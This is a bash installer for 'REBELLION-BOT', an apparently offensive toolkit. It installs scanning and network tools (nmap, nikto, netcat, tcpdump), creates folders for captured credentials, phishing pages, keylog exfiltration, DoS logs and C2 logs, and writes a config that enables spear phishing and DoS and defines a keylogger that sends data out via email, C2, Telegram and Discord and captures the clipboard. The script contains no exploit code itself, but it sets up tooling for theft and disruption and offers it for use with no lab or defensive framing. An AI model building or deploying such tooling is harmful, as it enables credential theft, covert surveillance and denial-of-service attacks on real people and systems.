#!/bin/bash
# REBELLION-BOT Installation Script for Linux/macOS
# Author: Ian Carter Kulani

set -e

echo "🔴 REBELLION-BOT Installation Script"
echo "====================================="
echo ""

# Colors
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
NC='\033[0m'

# Check Python version
echo -e "${BLUE}📌 Checking Python version...${NC}"
python_version=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
if [ "$(echo "$python_version < 3.7" | bc)" -eq 1 ]; then
    echo -e "${RED}❌ Python 3.7+ required. Found: $python_version${NC}"
    exit 1
fi
echo -e "${GREEN}✅ Python $python_version detected${NC}"

# Check OS
OS="$(uname -s)"
case "${OS}" in
    Linux*)     OS_TYPE="Linux";;
    Darwin*)    OS_TYPE="macOS";;
    *)          OS_TYPE="Unknown";;
esac
echo -e "${GREEN}✅ OS: $OS_TYPE${NC}"

# Check for sudo/root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${YELLOW}⚠️  Not running as root. Some features may require sudo.${NC}"
fi

echo ""
echo -e "${BLUE}📦 Installing system dependencies...${NC}"

# Install system dependencies based on OS
if [ "$OS_TYPE" = "Linux" ]; then
    if command -v apt-get &> /dev/null; then
        sudo apt-get update
        sudo apt-get install -y \
            python3-pip python3-dev python3-venv \
            nmap nikto curl netcat-openbsd dnsutils \
            whois traceroute iptables \
            build-essential libssl-dev libffi-dev \
            tcpdump wireshark-common \
            git wget
    elif command -v yum &> /dev/null; then
        sudo yum install -y \
            python3 python3-pip python3-devel \
            nmap nikto curl nc whois traceroute \
            iptables-services \
            openssl-devel libffi-devel \
            git wget
    elif command -v dnf &> /dev/null; then
        sudo dnf install -y \
            python3 python3-pip python3-devel \
            nmap nikto curl nc whois traceroute \
            iptables-services \
            openssl-devel libffi-devel \
            git wget
    elif command -v pacman &> /dev/null; then
        sudo pacman -S --noconfirm \
            python python-pip \
            nmap nikto curl netcat whois traceroute \
            iptables \
            openssl \
            git wget
    fi
elif [ "$OS_TYPE" = "macOS" ]; then
    if command -v brew &> /dev/null; then
        brew install \
            python3 nmap nikto curl netcat whois traceroute \
            openssl \
            git wget
    else
        echo -e "${YELLOW}⚠️  Homebrew not found. Installing...${NC}"
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        brew install python3 nmap nikto curl netcat whois traceroute openssl git wget
    fi
fi

echo ""
echo -e "${BLUE}🐍 Creating Python virtual environment...${NC}"
python3 -m venv rebellion_env
source rebellion_env/bin/activate

echo ""
echo -e "${BLUE}📦 Installing Python dependencies...${NC}"
pip install --upgrade pip setuptools wheel
pip install -r requirements.txt

echo ""
echo -e "${BLUE}🔧 Installing additional tools...${NC}"

# Install Nikto if not available
if ! command -v nikto &> /dev/null; then
    echo -e "${YELLOW}⚠️  Installing Nikto...${NC}"
    git clone https://github.com/sullo/nikto.git /tmp/nikto
    sudo cp -r /tmp/nikto/program/* /usr/local/bin/
    sudo chmod +x /usr/local/bin/nikto.pl
    sudo ln -sf /usr/local/bin/nikto.pl /usr/local/bin/nikto
fi

# Install Nmap if not available
if ! command -v nmap &> /dev/null; then
    echo -e "${YELLOW}⚠️  Installing Nmap...${NC}"
    if [ "$OS_TYPE" = "Linux" ]; then
        wget https://nmap.org/dist/nmap-7.94.tar.bz2
        tar -xjf nmap-7.94.tar.bz2
        cd nmap-7.94
        ./configure
        make
        sudo make install
        cd ..
        rm -rf nmap-7.94*
    fi
fi

echo ""
echo -e "${BLUE}📁 Creating directory structure...${NC}"
mkdir -p .rebellion_bot/{payloads,workspaces,scans,phishing_pages,phishing_templates,captured_credentials,ssh_keys,traffic_logs,nikto_results,keylog_exfil,deployments,domain_hosting,sessions,spear_phishing,email_templates,dos_logs,agents,c2_logs,modules,network_monitor,web_templates}
mkdir -p rebellion_reports/graphics
mkdir -p temp

echo ""
echo -e "${BLUE}⚙️  Setting permissions...${NC}"
chmod +x rebellion_bot.py
chmod +x install.sh
chmod +x run.sh

echo ""
echo -e "${BLUE}📝 Creating configuration files...${NC}"
cat > .rebellion_bot/config.json << EOF
{
    "version": "1.0.0",
    "auto_start": false,
    "auto_block_enabled": false,
    "auto_block_threshold": 5,
    "scan_timeout": 30,
    "report_format": "both",
    "generate_graphics": true,
    "keylogger": {
        "enabled": false,
        "hotkey": "f10",
        "log_file": ".rebellion_bot/keylog.txt",
        "c2_server": "",
        "upload_interval": 30,
        "exfil_methods": ["file", "email", "c2", "telegram", "discord"],
        "screenshot_interval": 60,
        "capture_clipboard": true
    },
    "web": {
        "enabled": false,
        "port": 5000,
        "host": "0.0.0.0",
        "require_auth": true,
        "username": "admin"
    },
    "spear_phishing": {
        "enabled": true,
        "smtp_server": "",
        "smtp_port": 587,
        "track_opens": true,
        "track_clicks": true
    },
    "dos": {
        "enabled": true,
        "max_threads": 100,
        "default_timeout": 60
    },
    "reports": {
        "enabled": true,
        "auto_generate": true,
        "format": "pdf",
        "include_graphics": true,
        "save_path": "rebellion_reports"
    }
}
EOF

echo ""
echo -e "${GREEN}✅ Installation complete!${NC}"
echo ""
echo -e "${BLUE}📌 To run REBELLION-BOT:${NC}"
echo "   source rebellion_env/bin/activate"
echo "   python3 rebellion_bot.py"
echo ""
echo -e "${BLUE}📌 Or use:${NC}"
echo "   ./run.sh"
echo ""
echo -e "${YELLOW}⚠️  For full functionality, run with:${NC}"
echo "   sudo python3 rebellion_bot.py"
echo ""
echo -e "${BLUE}📌 Commands:${NC}"
echo "   - Type 'help' for command list"
echo "   - Press F10 for keylogger control"
echo "   - Use 'deploy_*' for payload creation"
echo "   - Use 'generate_report' for PDF reports"